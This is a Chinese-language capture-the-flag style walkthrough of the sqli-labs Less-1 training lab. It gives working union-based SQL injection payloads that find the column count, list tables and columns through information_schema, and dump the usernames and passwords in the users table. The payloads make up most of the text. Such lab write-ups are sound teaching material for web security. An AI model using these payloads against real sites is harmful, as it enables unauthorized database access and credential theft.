vulfocus/sqli-labs Less1 SQLI DUMB SERIES-1

输入?id=1后页面显示登录成功，用户名Dumb密码Dumb

输入?id=1’ 语法出现报错

输入?id=1’ order by 1 –+ 或?id=1’ order by 1 #就可以注释掉系统后面的代码
页面显示正常，可以判断存在单引号的注入问题。

尝试输入
?id=1’ and 1=2 order by 1 –+
?id=1’ and 1=2 order by 2 –+
?id=1’ and 1=2 order by 3 –+皆无错误

当字段到4是回显错误，说明有3个字段。

输入?id=-1’ union select 1,2,3–+查询数据库的名字
注：这里使用-1使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句。

输入?id=-1’ and 1=2 union select 1,database(),3–+查询数据库

输入?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+

查询第三个数据库的表名

输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+

查询users表内容

输入?id=-1’ union select 1,2,concat(id,0x3a,username,0x3a,password) from users –+
查询id、用户名、密码
